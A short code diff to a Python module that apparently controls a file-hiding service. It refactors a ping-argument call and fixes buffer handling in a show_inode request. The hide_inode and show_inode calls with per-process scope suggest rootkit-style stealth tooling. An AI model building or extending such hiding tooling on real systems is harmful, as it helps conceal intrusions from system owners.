@@ -68,9 +68,17 @@ def ping(arg: Optional[int] = None):
         return False
 
 
-def change_ping_arg(new_arg: int):
-    service_request(SERVICE_CHANGE_PING_ARG, new_arg)
+def change_ping_arg(new_arg: int, old_arg: Optional[int] = None):
     global ping_arg
+
+    if old_arg is None:
+        old_arg = ping_arg
+
+    request_info = struct.pack('@LL', old_arg, new_arg)
+    buffer = ctypes.c_buffer(request_info)
+    info_ptr = ctypes.addressof(buffer)
+    service_request(SERVICE_CHANGE_PING_ARG, info_ptr)
+
     ping_arg = new_arg
 
 
@@ -84,7 +92,8 @@ def hide_inode(inode: int):
 
 def show_inode(inode: int, pid: int = ALL_PIDS):    
     request_info = struct.pack('@Li', inode, pid)
-    info_ptr = ctypes.addressof(ctypes.c_buffer(request_info))
+    buffer = ctypes.c_buffer(request_info)
+    info_ptr = ctypes.addressof(buffer)
     service_request(SERVICE_SHOW_FILE_INODE, info_ptr)
 
 
